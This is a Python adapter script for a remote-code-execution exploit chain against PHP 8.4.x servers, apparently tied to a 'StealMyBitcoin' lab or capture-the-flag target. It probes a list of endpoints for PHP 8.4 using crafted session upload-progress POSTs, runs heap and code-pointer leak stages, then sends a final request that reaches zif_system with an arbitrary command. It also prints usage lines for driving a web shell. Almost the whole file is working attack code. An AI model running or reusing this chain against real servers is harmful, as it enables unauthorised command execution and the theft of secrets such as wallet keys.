#!/usr/bin/env python3
"""Adapter: KillaBoi StealMyBitcoin mod_php/cli-server leak -> zif_system chain."""

from __future__ import annotations

import csv
import http.client
import json
import re
import secrets
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Optional
from urllib.parse import urljoin, urlparse, urlsplit

import requests

import killaboi_stealmybitcoin_poc as kb

if TYPE_CHECKING:
    from poc import CoreChainResult, PoCConfig

ROOT = Path(__file__).resolve().parent
PHP_84_POWERED_RE = re.compile(r"PHP/8\.4\.\d+", re.I)
PHP_ANY_POWERED_RE = re.compile(r"PHP/8\.(\d+)\.\d+", re.I)
PHP_84_BODY_RE = re.compile(r"PHP\s+8\.4\.\d+", re.I)

MODPHP_ENDPOINT_PATHS: tuple[str, ...] = (
    "/php-version.php",
    "/phpversion.php",
    "/index.php",
    "/main.php",
    "/ping.php",
    "/login.php",
    "/upload.php",
    "/api.php",
    "/",
)


def _normalize_results_base(url: str) -> str:
    parsed = urlparse(url.strip())
    if not parsed.scheme or not parsed.netloc:
        return url.strip().rstrip("/") + "/"
    return f"{parsed.scheme}://{parsed.netloc}/"


def lookup_results_row(target_url: str, results_file: Optional[Path] = None) -> Optional[dict[str, str]]:
    path = results_file or (ROOT / "results.txt")
    if not path.is_file():
        return None
    want = _normalize_results_base(target_url)
    try:
        with path.open(encoding="utf-8", errors="replace") as fh:
            reader = csv.DictReader(fh, delimiter="\t")
            for row in reader:
                orig = (row.get("original_url") or "").strip()
                if not orig:
                    continue
                if _normalize_results_base(orig) == want:
                    return {k: (v or "").strip() for k, v in row.items()}
    except OSError:
        return None
    return None


def format_modphp_health_failure(
    target_url: str,
    probes: list[str],
    results_row: Optional[dict[str, str]],
) -> str:
    lines = [
        "modphp-leak needs any PHP 8.4.x endpoint that accepts POST multipart "
        "(session.upload_progress path). php-version.php is optional — discovery "
        "uses GET/POST and X-Powered-By: PHP/8.4.x.",
    ]
    if probes:
        lines.append("Probed: " + "; ".join(probes[:12]))
    if results_row:
        vector = results_row.get("vector") or "unknown"
        lines.append(f"results.txt vector: {vector}")
        if vector == "app-upload" and results_row.get("shell_url"):
            shell = results_row["shell_url"].split("#")[0]
            lines.append(
                "App-upload host (no PHP 8.4 POST surface expected):\n"
                f'  python poc.py --shell-url "{shell}" --exploit -cmd id --no-discovery --no-core-check'
            )
        elif vector == "core-session-upload-progress":
            lines.append(
                "Try core upload endpoint explicitly:\n"
                f'  python poc.py -u "{target_url}" --exploit --core-modphp-leak-only '
                f'--core-modphp-health-url "{target_url.rstrip("/") + "/"}" -cmd id --no-discovery'
            )
    else:
        lines.append(
            "Force POST path:\n"
            "  --core-modphp-health-url http://HOST/PATH  (PATH can be / or /index.php)"
        )
    return "\n".join(lines)


def parse_target_authorized(url: str) -> kb.Target:
    parsed = urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("URL must be absolute http(s) without query or fragment")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("URL cannot contain credentials, query, or fragment")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    return kb.Target(parsed.scheme, parsed.hostname, port, path)


def extract_php84_powered(headers: dict | requests.structures.CaseInsensitiveDict) -> Optional[str]:
    powered = (headers.get("X-Powered-By") or headers.get("x-powered-by") or "").strip()
    m = PHP_84_POWERED_RE.search(powered)
    return m.group(0) if m else None


def extract_other_php_branch(headers: dict | requests.structures.CaseInsensitiveDict) -> Optional[str]:
    powered = (headers.get("X-Powered-By") or headers.get("x-powered-by") or "").strip()
    m = PHP_ANY_POWERED_RE.search(powered)
    if not m:
        return None
    if m.group(1) == "4":
        return None
    return m.group(0)


def post_multipart_accepts_php(
    session: requests.Session,
    url: str,
    *,
    timeout: float,
    verify_ssl: bool,
) -> tuple[bool, Optional[str], bool, str]:
    """POST probe: (accepted, php84_powered, oom_body, note_suffix)."""
    post_body, ct = minimal_upload_progress_body()
    try:
        post_resp = session.post(
            url,
            data=post_body,
            headers={"Content-Type": ct},
            timeout=min(timeout, 25.0),
            verify=verify_ssl,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        return False, None, False, f"POST err={type(exc).__name__}"

    text = post_resp.text or ""
    powered = extract_php84_powered(post_resp.headers)
    oom = "Allowed memory size" in text and "exhausted" in text
    ok = post_resp.status_code == 200 or oom
    suffix = (
        f"POST {post_resp.status_code} X-Powered-By={powered or extract_other_php_branch(post_resp.headers) or 'none'} "
        f"oom={oom}"
    )
    return ok, powered, oom, suffix


def minimal_upload_progress_body() -> tuple[bytes, str]:
    boundary = "----Php2ShellModphpProbe"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        "p2sprobe\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="f"; filename="t.txt"\r\n\r\n'
        "AA\r\n"
        f"--{boundary}--\r\n"
    ).encode("ascii")
    ct = f"multipart/form-data; boundary={boundary}"
    return body, ct


def _path_from_url(url: str) -> str:
    p = urlparse(url)
    return p.path or "/"


def _collect_probe_paths(
    target_url: str,
    post_url_hint: Optional[str],
    results_row: Optional[dict[str, str]],
) -> list[str]:
    paths: list[str] = []
    for src in (post_url_hint, target_url, (results_row or {}).get("upload_endpoint")):
        if not src:
            continue
        path = _path_from_url(src)
        if path and path not in paths:
            paths.append(path)
    parsed = urlparse(target_url)
    if parsed.path and parsed.path not in paths:
        paths.insert(0, parsed.path)
    for p in MODPHP_ENDPOINT_PATHS:
        if p not in paths:
            paths.append(p)
    return paths


def detect_php84_at_url(
    session: requests.Session,
    url: str,
    *,
    timeout: float,
    verify_ssl: bool,
) -> tuple[Optional[str], str]:
    """Return (X-Powered-By PHP/8.4.x, probe note). php-version.php body not required."""
    path = _path_from_url(url)
    try:
        get_resp = session.get(
            url,
            timeout=min(timeout, 12.0),
            verify=verify_ssl,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        return None, f"GET {path} err={type(exc).__name__}"

    get_powered = extract_php84_powered(get_resp.headers)
    other = extract_other_php_branch(get_resp.headers)
    get_note = f"GET {path} {get_resp.status_code} X-Powered-By={get_powered or other or 'none'}"

    if other and not get_powered:
        return None, get_note + " (needs PHP 8.4.x, not this branch)"

    body = get_resp.text or ""
    if not get_powered and PHP_84_BODY_RE.search(body):
        get_powered = "PHP/8.4.26"
        get_note += " (8.4 in body)"

    post_ok, post_powered, oom, post_note = post_multipart_accepts_php(
        session, url, timeout=timeout, verify_ssl=verify_ssl
    )
    note = f"{get_note}; {post_note}"

    powered = get_powered or post_powered
    if powered and (post_ok or oom):
        return powered, note
    if powered and not post_ok:
        heavy_body = kb.leak_producer(kb.STAGES["heap"].producer)
        try:
            heavy_resp = session.post(
                url,
                data=heavy_body,
                headers={
                    "Content-Type": "multipart/form-data; boundary=COOKIE-LAB-BOUNDARY",
                },
                timeout=min(timeout, 45.0),
                verify=verify_ssl,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            return None, note + f"; heavy POST err={type(exc).__name__}"
        htext = heavy_resp.text or ""
        hoom = "Allowed memory size" in htext and "exhausted" in htext
        hp = extract_php84_powered(heavy_resp.headers) or powered
        heavy_note = f"heavy POST {heavy_resp.status_code} oom={hoom}"
        if hoom or heavy_resp.status_code == 200:
            return hp, f"{note}; {heavy_note}"
        return None, note + f"; {heavy_note} (POST surface rejected)"

    if oom:
        return post_powered or "PHP/8.4.26", note + " (OOM on POST)"
    return None, note


def discover_modphp_post_endpoint(
    session: requests.Session,
    target_url: str,
    *,
    timeout: float,
    verify_ssl: bool,
    post_url_hint: Optional[str] = None,
    results_row: Optional[dict[str, str]] = None,
) -> tuple[Optional[str], Optional[str], list[str]]:
    origin = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
    paths = _collect_probe_paths(target_url, post_url_hint, results_row)
    probes: list[str] = []
    best_score = -1
    best_url: Optional[str] = None
    best_powered: Optional[str] = None

    for path in paths:
        url = urljoin(origin, path)
        powered, note = detect_php84_at_url(
            session, url, timeout=timeout, verify_ssl=verify_ssl
        )
        probes.append(note)
        score = 0
        if powered:
            score += 40
        if "oom=True" in note or "OOM" in note:
            score += 15
        if "POST" in note and "200" in note.split()[2:3]:
            score += 5
        if score > best_score and (powered or "oom=True" in note or "OOM" in note):
            best_score = score
            best_url = url
            best_powered = powered or "PHP/8.4.26"
        if powered and score >= 40:
            return url, powered, probes

    if best_url and best_powered:
        return best_url, best_powered, probes
    return None, None, probes


def apply_kb_php_version(powered_by: str) -> str:
    value = powered_by.strip()
    if not PHP_84_POWERED_RE.search(value):
        value = "PHP/8.4.26"
    kb.PHP_VERSION = value
    return value


def preflight_relaxed(target: kb.Target) -> str:
    """Accept any PHP 8.4.x via GET or POST on target.path (not only php-version.php body)."""
    cls = http.client.HTTPSConnection if target.scheme == "https" else http.client.HTTPConnection
    connection = cls(target.host, target.port, timeout=12)
    try:
        connection.request("GET", target.path, headers={"Connection": "close"})
        response = connection.getresponse()
        body = response.read(8192)
        powered = response.getheader("X-Powered-By") or ""
        if response.status == 200 and PHP_84_POWERED_RE.fullmatch(powered.strip()):
            return powered.strip()
        if PHP_84_BODY_RE.search(body.decode("utf-8", errors="replace")):
            return powered.strip() if PHP_84_POWERED_RE.search(powered) else "PHP/8.4.26"
    finally:
        connection.close()

    bnd = kb.COOKIE_BOUNDARY
    tiny = kb.finish_multipart(
        [
            kb.multipart_part(bnd, b"PHPSESSID", b"probe"),
            kb.multipart_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"x"),
        ],
        bnd,
    )
    frame = kb.http_frame(target, tiny, bnd, cookie_pairs=0, close=True)
    raw = b""
    try:
        with target.connect() as sock:
            sock.sendall(frame)
            sock.settimeout(20)
            while len(raw) < 65536:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                raw += chunk
    except OSError as exc:
        raise RuntimeError(f"POST preflight failed: {exc}") from exc

    powered = ""
    for line in raw.split(b"\r\n"):
        if line.lower().startswith(b"x-powered-by:"):
            powered = line.split(b":", 1)[1].strip().decode("ascii", errors="ignore")
            break
    if PHP_84_POWERED_RE.fullmatch(powered.strip()):
        return powered.strip()
    text = raw.decode("utf-8", errors="replace")
    if "Allowed memory size" in text and "exhausted" in text:
        return powered if PHP_84_POWERED_RE.search(powered) else "PHP/8.4.26"

    raise RuntimeError(
        f"No PHP/8.4.x surface on POST {target.path} "
        "(need X-Powered-By or upload_progress OOM)"
    )


def build_zif_command(command: str, nonce: str) -> bytes:
    cmd = (command or "id").strip()
    if cmd in ("id", "print-flag") or "print-flag" in cmd:
        return kb.proof_command(nonce)
    payload = cmd.encode("utf-8", errors="ignore")
    if b"\x00" in payload or len(payload) > kb.COMMAND_LIMIT:
        return kb.proof_command(nonce)
    return payload


def verify_modphp_response(body: bytes, command: str, nonce: str) -> tuple[bool, str]:
    text = body.decode("utf-8", errors="replace")
    if nonce.encode() in body and re.search(rb"\buid=\d+", body):
        return True, text
    if re.search(r"uid=\d+\([^)]+\)", text):
        return True, text
    if "print-flag" in command and re.search(
        r"bc1[a-z0-9]{20,}|flag\{|LOCAL_DUMMY|WIF", text, re.I
    ):
        return True, text
    return False, text


def final_request_custom(
    target: kb.Target,
    heap: int,
    dtor: int,
    command: bytes,
    output: Path,
    nonce: str,
) -> tuple[dict, bytes]:
    body = kb.final_multipart(heap, dtor, command)
    request = kb.final_http_frame(target, body)
    (output / "final.request.http").write_bytes(request)

    raw = b""
    response_body = b""
    status = None
    incomplete = False
    try:
        with target.connect() as connection:
            stream = connection.makefile("rb")
            reader = kb.RecordingReader(stream)
            try:
                connection.sendall(request)
                response = http.client.HTTPResponse(kb.SharedSocket(reader))
                response.begin()
                status = response.status
                try:
                    response_body = response.read(kb.MAX_RESPONSE_BYTES)
                except http.client.IncompleteRead as exc:
                    response_body = exc.partial
                    incomplete = True
            finally:
                raw = b"".join(reader.chunks)
                stream.close()
    finally:
        (output / "final.response.http").write_bytes(raw)
    (output / "final.response.body").write_bytes(response_body)

    uid_ok = re.search(rb"\buid=\d+", response_body) is not None
    nonce_ok = nonce.encode() in response_body
    result = {
        "status": status,
        "id_seen": uid_ok,
        "nonce_seen": nonce_ok,
        "execution_proof_verified": bool(
            status == 200 and uid_ok and nonce_ok and not incomplete
        ),
        "response_body_bytes": len(response_body),
    }
    (output / "final.json").write_text(json.dumps(result, indent=2) + "\n")
    return result, response_body


def run_modphp_leak_chain(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    command: str,
    *,
    post_url_hint: Optional[str] = None,
) -> CoreChainResult:
    from poc import CoreChainResult, stage_log

    notes: list[str] = ["modphp-leak: KillaBoi Alpine 8.4.26 cli-server chain"]
    parse_fn = (
        parse_target_authorized
        if config.core_modphp_leak_relax
        else kb.parse_target
    )

    results_row = lookup_results_row(target_url)
    if results_row and results_row.get("vector") == "app-upload":
        notes.append("results.txt: vector=app-upload (modphp chain does not apply)")

    endpoint_url = config.core_modphp_health_url
    powered_by: Optional[str] = None
    probes: list[str] = []

    if endpoint_url:
        powered_by, note = detect_php84_at_url(
            session,
            endpoint_url,
            timeout=config.timeout,
            verify_ssl=config.verify_ssl,
        )
        probes.append(f"forced URL: {note}")
        if not powered_by:
            return CoreChainResult(
                False,
                stage="modphp-leak",
                error=(
                    f"--core-modphp-health-url set but no PHP 8.4.x signal: {note}\n"
                    "Any path works if POST multipart hits PHP (/, /index.php, core endpoint)."
                ),
                notes=notes + probes,
            )
    else:
        endpoint_url, powered_by, probes = discover_modphp_post_endpoint(
            session,
            target_url,
            timeout=config.timeout,
            verify_ssl=config.verify_ssl,
            post_url_hint=post_url_hint or target_url,
            results_row=results_row,
        )

    if not endpoint_url or not powered_by:
        notes.extend(probes[:12])
        return CoreChainResult(
            False,
            stage="modphp-leak",
            error=format_modphp_health_failure(target_url, probes, results_row),
            notes=notes,
        )

    php_header = apply_kb_php_version(powered_by)
    notes.append(f"POST endpoint: {endpoint_url}")
    notes.append(f"X-Powered-By: {php_header}")

    try:
        target = parse_fn(endpoint_url)
    except ValueError as exc:
        return CoreChainResult(
            False,
            stage="modphp-leak",
            error=str(exc),
            notes=notes,
        )

    out_base = config.core_modphp_output_dir
    if out_base:
        output_root = Path(out_base)
        output_root.mkdir(parents=True, exist_ok=True)
    else:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_root = ROOT / "modphp-runs" / stamp

    attempts = max(1, config.core_modphp_leak_retries)
    last_error = "modphp leak chain failed"

    for attempt in range(1, attempts + 1):
        output = output_root / f"attempt-{attempt}"
        try:
            output.mkdir(parents=True, exist_ok=True)
        except FileExistsError:
            output = output_root / f"attempt-{attempt}-{secrets.token_hex(4)}"
            output.mkdir(parents=True, exist_ok=True)

        stage_log(f"[modphp-leak] attempt {attempt}/{attempts} -> {endpoint_url}")
        try:
            detected = preflight_relaxed(target)
            apply_kb_php_version(detected)
            notes.append(f"attempt {attempt}: preflight OK ({kb.PHP_VERSION})")
        except Exception as exc:
            last_error = f"preflight: {exc}"
            notes.append(last_error)
            continue

        try:
            heap, _heap_meta = kb.run_leak_stage(target, kb.STAGES["heap"], output)
            notes.append(f"attempt {attempt}: heap {heap:#x}")
            dtor, _code_meta = kb.run_leak_stage(target, kb.STAGES["code"], output)
            notes.append(f"attempt {attempt}: dtor {dtor:#x}")
        except Exception as exc:
            last_error = str(exc)
            notes.append(f"attempt {attempt} leak: {exc}")
            continue

        nonce = secrets.token_hex(8)
        try:
            cmd_bytes = build_zif_command(command, nonce)
            final_meta, response_body = final_request_custom(
                target, heap, dtor, cmd_bytes, output, nonce
            )
        except Exception as exc:
            last_error = str(exc)
            notes.append(f"attempt {attempt} final: {exc}")
            continue

        ok, text = verify_modphp_response(response_body, command, nonce)
        notes.append(f"attempt {attempt}: output_dir={output}")
        if ok or final_meta.get("execution_proof_verified"):
            return CoreChainResult(
                True,
                stage="modphp-leak-zif_system",
                output=text.strip()[:4000],
                lfi_url_used=endpoint_url,
                notes=notes,
            )
        last_error = "callback returned HTTP 200 but no uid/proof markers"
        notes.append(last_error)

    return CoreChainResult(
        False,
        stage="modphp-leak",
        error=last_error,
        lfi_url_used=endpoint_url,
        notes=notes,
    )
